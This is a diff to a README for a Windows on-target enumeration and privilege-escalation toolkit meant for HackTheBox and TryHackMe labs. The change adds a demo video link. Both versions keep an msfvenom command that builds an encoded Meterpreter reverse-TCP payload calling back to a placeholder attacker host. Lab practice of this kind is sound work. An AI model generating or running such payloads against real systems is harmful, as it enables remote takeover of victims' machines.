@@ -7,7 +7,7 @@
 * https://www.hackthebox.eu/
 * https://tryhackme.com/
 
-Automates or simplifies many on target functions. Designed for windows targets. It isn't pretty, but it works as intended. I have included an assortment of common windows enumeration and escalation tools.  To generate your own msfvenom payload:
+Automates or simplifies many on target functions. Designed for windows targets. See it in action at https://kdgwebsolutions.com/assets/img/videos/proof-of-concept-for-learning-management-system-exploits.mp4. I have included an assortment of common windows enumeration and escalation tools.  To generate your own msfvenom payload:
 
 venom.exe : `sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe`
 
